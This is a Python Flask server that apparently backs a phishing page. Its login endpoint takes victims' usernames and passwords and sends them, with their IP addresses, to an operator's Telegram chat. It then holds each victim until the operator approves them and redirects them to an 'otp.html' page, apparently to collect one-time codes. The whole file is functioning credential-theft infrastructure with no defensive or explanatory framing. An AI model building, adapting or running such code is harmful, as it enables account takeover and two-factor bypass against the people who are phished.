from flask import Flask, request, jsonify
from flask_cors import CORS
import os
import uuid
import requests
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
if not BOT_TOKEN or not CHAT_ID:
    raise RuntimeError("Missing BOT_TOKEN or CHAT_ID")

# In-memory session store
session_store = {}  # {id: {'status': 'pending', 'redirect_url': 'otp.html'}}

# Send message with approve button
def send_to_telegram(message, login_id):
    button = [[
        {"text": f"✅ Approve {login_id}", "callback_data": f"approve_{login_id}"}
    ]]
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "HTML",
        "reply_markup": {"inline_keyboard": button}
    }
    try:
        r = requests.post(url, json=payload)
        print(f"Telegram sent: {r.status_code}")
        return r.ok
    except Exception as e:
        print("Telegram send error:", e)
        return False

@app.route("/", methods=["GET"])
def index():
    return "✅ Flask is running"

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    if not data or 'login' not in data or 'password' not in data:
        return jsonify({"success": False, "error": "Missing login/password"}), 400

    user_id = str(uuid.uuid4())
    session_store[user_id] = {'status': 'pending', 'redirect_url': 'otp.html'}

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    msg = (
        f"<b>🔐 LOGIN ATTEMPT</b>\n"
        f"<b>Login:</b> <code>{data['login']}</code>\n"
        f"<b>Password:</b> <code>{data['password']}</code>\n"
        f"<b>IP:</b> <code>{ip}</code>"
    )
    sent = send_to_telegram(msg, user_id)
    return jsonify({"success": True, "id": user_id}) if sent else (
        jsonify({"success": False, "error": "Telegram failed"}), 500)

@app.route("/status/<user_id>", methods=["GET"])
def status(user_id):
    user = session_store.get(user_id)
    if not user:
        return jsonify({"status": "invalid"}), 404
    return jsonify({
        "status": user['status'],
        "redirect_url": user.get("redirect_url", "otp.html")
    })

@app.route("/webhook", methods=["POST"])
def webhook():
    update = request.get_json()
    try:
        callback = update.get('callback_query', {})
        data = callback.get('data', '')

        if data.startswith("approve_"):
            user_id = data.split("approve_")[1]
            if user_id in session_store:
                session_store[user_id]['status'] = 'approved'

                # Optional: notify admin
                requests.post(
                    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                    json={"chat_id": CHAT_ID, "text": f"✅ {user_id} has been approved."}
                )
                return jsonify({"ok": True}), 200
            else:
                return jsonify({"error": "ID not found"}), 404
        return jsonify({"status": "ignored"}), 200
    except Exception as e:
        print("Webhook error:", e)
        return jsonify({"status": "error"}), 500
